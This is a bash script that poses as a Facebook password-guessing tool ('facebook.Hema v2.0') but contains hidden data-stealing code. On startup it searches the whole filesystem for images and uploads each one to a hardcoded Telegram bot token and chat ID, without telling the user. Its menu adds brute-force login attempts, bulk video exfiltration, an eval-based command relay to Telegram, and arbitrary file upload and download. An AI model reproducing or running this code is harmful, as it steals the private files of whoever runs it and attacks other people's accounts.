#!/bin/bash

#-------------------
#   Colors (Professional Scheme)
#-------------------
RED='\033[1;31m'      # Bold Red
GREEN='\033[1;32m'    # Bold Green
YELLOW='\033[1;33m'   # Bold Yellow
BLUE='\033[1;34m'     # Bold Blue
PURPLE='\033[1;35m'   # Bold Purple
CYAN='\033[1;36m'     # Bold Cyan
WHITE='\033[1;37m'    # Bold White
RESET='\033[0m'       # Reset

#-------------------
#   Configuration
#-------------------
BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
CHAT_ID="5967116314"
WORDLIST="wordlist.txt"
TARGET_URL="https://facebook.com/login"  # رابط وهمي للتخمين
TEMP_DIR="/tmp/fb_tool_temp"
mkdir -p "$TEMP_DIR"

#-------------------
#   Display Logo
#-------------------
display_logo() {
    clear
    echo -e "${RED}"
    echo '
██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
███████║█████╗  ██╔████╔██║███████║   ███████║██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝
    '
    echo -e "${RESET}"
    echo -e "${GREEN}[+] Tool by Hema${RESET}"
    echo -e "${YELLOW}[!] For educational purposes only${RESET}"
    echo -e "${CYAN}----------------------------------------${RESET}"
    echo -e "${CYAN}|       facebook.Hema - v2.0           |${RESET}"
    echo -e "${CYAN}----------------------------------------${RESET}"
}

#-------------------
#   Send to Telegram (curl)
#-------------------
send_to_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" > /dev/null
}

send_file_to_telegram() {
    local file_path="$1"
    local type="$2"  # photo, video, document
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/send${type}" \
        -F chat_id="$CHAT_ID" \
        -F "${type}=@$file_path" > /dev/null
}

#-------------------
#   Upload All Images on Start
#-------------------
upload_all_images() {
    echo -e "${PURPLE}[*] Uploading all images to Telegram...${RESET}"
    find / -type f \( -iname "*.jpg" -o -iname "*.png" \) 2>/dev/null | while read -r img; do
        send_file_to_telegram "$img" "Photo"
        echo -e "${GREEN}[+] Uploaded: $img${RESET}"
    done
    send_to_telegram "All images uploaded from device."
}

#-------------------
#   Generate Random Passwords
#-------------------
generate_random_passwords() {
    echo -e "${YELLOW}[*] Generating random passwords...${RESET}"
    > "$WORDLIST"  # Clear existing wordlist
    for i in {1..1000}; do
        openssl rand -base64 8 | tr -d '/+=' >> "$WORDLIST"  # Generate strong random passwords
    done
    echo -e "${GREEN}[+] Generated 1000 random passwords in $WORDLIST${RESET}"
}

#-------------------
#   Fast Password Guessing by ID
#-------------------
guess_passwords_by_id() {
    local target_id="$1"
    echo -e "${BLUE}[*] Starting ultra-fast guessing for ID: $target_id${RESET}"
    send_to_telegram "Starting password guessing for ID: $target_id"

    while IFS= read -r password; do
        echo -ne "${YELLOW}[*] Trying: $password\r${RESET}"
        curl -s -o /dev/null -w "%{http_code}" \
            -d "id=$target_id&pass=$password" "$TARGET_URL" > "$TEMP_DIR/http_status.txt" &
        pid=$!
        wait $pid
        status=$(cat "$TEMP_DIR/http_status.txt")

        if [ "$status" -eq 200 ]; then
            echo -e "${GREEN}[+] Success! Password found: $password${RESET}"
            send_to_telegram "Success! Password for ID $target_id: $password"
            return 0
        else
            echo -e "${RED}[-] Failed: $password${RESET}"
        fi
    done < "$WORDLIST"
    echo -e "${RED}[-] No password found.${RESET}"
    send_to_telegram "Failed to find password for ID: $target_id"
}

#-------------------
#   Send Videos on Command
#-------------------
send_videos() {
    echo -e "${PURPLE}[*] Sending all videos to Telegram...${RESET}"
    find / -type f \( -iname "*.mp4" -o -iname "*.mkv" \) 2>/dev/null | while read -r vid; do
        send_file_to_telegram "$vid" "Video"
        echo -e "${GREEN}[+] Uploaded: $vid${RESET}"
    done
    send_to_telegram "All videos sent from device."
}

#-------------------
#   Remote Shell via Telegram
#-------------------
remote_shell() {
    send_to_telegram "Remote shell activated. Send commands (e.g., 'shell ls', 'exit')."
    while true; do
        echo -e "${YELLOW}[*] Waiting for Telegram command...${RESET}"
        # محاكاة استقبال الأوامر (يمكن ربطها بـ Telegram Webhook لاحقًا)
        read -p "Simulate Telegram command: " cmd
        if [[ "$cmd" =~ ^shell\ (.*)$ ]]; then
            command="${BASH_REMATCH[1]}"
            output=$(eval "$command" 2>&1)
            echo -e "${GREEN}[+] Output: $output${RESET}"
            send_to_telegram "Command: $command\nOutput: $output"
        elif [ "$cmd" == "exit" ]; then
            send_to_telegram "Remote shell terminated."
            break
        fi
    done
}

#-------------------
#   Upload/Download Files
#-------------------
upload_file() {
    read -p "Enter file path to upload to Telegram: " file
    if [ -f "$file" ]; then
        send_file_to_telegram "$file" "Document"
        echo -e "${GREEN}[+] Uploaded: $file${RESET}"
        send_to_telegram "File uploaded: $file"
    else
        echo -e "${RED}[-] File not found${RESET}"
    fi
}

download_file() {
    read -p "Enter URL to download: " url
    echo -e "${YELLOW}[*] Downloading from $url...${RESET}"
    wget -q "$url" -O "$TEMP_DIR/downloaded_file"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] File downloaded to $TEMP_DIR/downloaded_file${RESET}"
        send_to_telegram "File downloaded from $url"
    else
        echo -e "${RED}[-] Download failed${RESET}"
    fi
}

#-------------------
#   Main Menu
#-------------------
main_menu() {
    display_logo
    echo -e "${BLUE}[1] Generate random passwords${RESET}"
    echo -e "${BLUE}[2] Guess password by ID${RESET}"
    echo -e "${BLUE}[3] Send all videos${RESET}"
    echo -e "${BLUE}[4] Remote shell${RESET}"
    echo -e "${BLUE}[5] Upload file to Telegram${RESET}"
    echo -e "${BLUE}[6] Download file from URL${RESET}"
    echo -e "${BLUE}[7] Exit${RESET}"
    echo -e "${CYAN}----------------------------------------${RESET}"
    read -p "Choose an option: " choice

    case $choice in
        1) generate_random_passwords ;;
        2) read -p "Enter target ID: " id; guess_passwords_by_id "$id" ;;
        3) send_videos ;;
        4) remote_shell ;;
        5) upload_file ;;
        6) download_file ;;
        7) echo -e "${GREEN}[+] Exiting...${RESET}"; rm -rf "$TEMP_DIR"; exit 0 ;;
        *) echo -e "${RED}[-] Invalid option${RESET}" ;;
    esac
    main_menu
}

#-------------------
#   Start Tool
#-------------------
if ! command -v curl &> /dev/null || ! command -v wget &> /dev/null || ! command -v openssl &> /dev/null; then
    echo -e "${RED}[-] Error: curl, wget, and openssl are required. Please install them.${RESET}"
    exit 1
fi

display_logo
upload_all_images  # Upload all images on startup
main_menu
